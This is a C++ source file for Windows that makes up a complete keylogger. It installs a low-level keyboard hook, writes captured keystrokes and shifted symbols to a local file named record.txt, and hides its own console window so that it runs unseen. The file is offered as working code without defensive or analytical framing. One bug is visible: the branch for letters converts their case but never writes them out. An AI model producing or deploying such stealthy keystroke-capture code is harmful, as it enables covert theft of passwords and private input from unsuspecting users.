#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

class Keylogger {
private:
    static ofstream write;
    static HHOOK keyboardHook;

public:
    Keylogger() {
        write.open("record.txt", ios::app); // Open file in append mode
        hideConsole(); // Hide console on startup
    }

    ~Keylogger() {
        if (write.is_open()) {
            write.close(); // Close file when object is destroyed
        }
    }

    void startLogging() {
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger::keyLoggerProc, NULL, 0);
        if (!keyboardHook) {
            cout << "Failed to install hook!" << endl;
            return;
        }
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(keyboardHook);
    }

private:
    static LRESULT CALLBACK keyLoggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
            char key = static_cast<char>(keyInfo->vkCode);
            logKey(key);
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    static void logKey(char key) {
        if (write.is_open()) {
            if (key >= 65 && key <= 90) { // A-Z
                if (!(GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
                    key += 32; // Convert uppercase to lowercase
                }
            } else if (key >= 48 && key <= 57) { // 0-9
                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                    string symbols[] = {")", "!", "@", "#", "$", "%", "^", "&", "*", "("};
                    write << symbols[key - 48];
                    write.flush();
                    return;
                }
            } else {
                switch (key) {
                    case VK_SPACE: write << " "; break;
                    case VK_RETURN: write << "\n"; break;
                    case VK_TAB: write << "    "; break;
                    case VK_BACK: write << "<BACKSPACE>"; break;
                    case VK_ESCAPE: write << "<ESCAPE>"; break;
                    case VK_DELETE: write << "<DELETE>"; break;
                    default: write << key; break;
                }
            }
            write.flush();
        }
    }

    void hideConsole() {
        HWND stealth;
        AllocConsole();
        stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0); // Hide console window
    }
};

// Define static members
ofstream Keylogger::write;
HHOOK Keylogger::keyboardHook;

int main() {
    Keylogger keylogger;
    keylogger.startLogging();
    return 0;
}
